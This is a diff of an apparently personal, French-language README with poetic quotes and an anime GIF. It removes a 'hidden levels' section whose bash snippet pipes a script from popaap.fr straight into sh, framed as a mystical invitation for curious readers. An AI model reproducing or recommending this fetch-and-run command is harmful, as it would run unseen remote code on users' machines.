@@ -63,23 +63,6 @@ Chaque ligne que j’écris est un fragment de vérité en sommeil.
   <img src="https://media.tenor.com/NX-Nh3EO6FYAAAAC/itachi-anime.gif" width="340" />
 </p>
 
----
-
-## 🧭 Niveaux Cachés
-
-> "Ce que tu vois ici n’est qu’un écran. Ce qui compte, c’est ce que tu pressens entre les `README`, dans les silences du code."
-
-```bash
-# Pour les lecteurs en quête de sens
-if grep -q "₊˚.༄" ~/README.md; then
-    curl -s https://popaap.fr/initiat | sh
-fi
-```
-
-> Ceux qui comprennent n’ont pas besoin d’explication. Les autres… sont déjà trop tard.
-
----
-
 ## 📌 Conclusion
 
 > “Je n’ai pas appris. J’ai observé.  
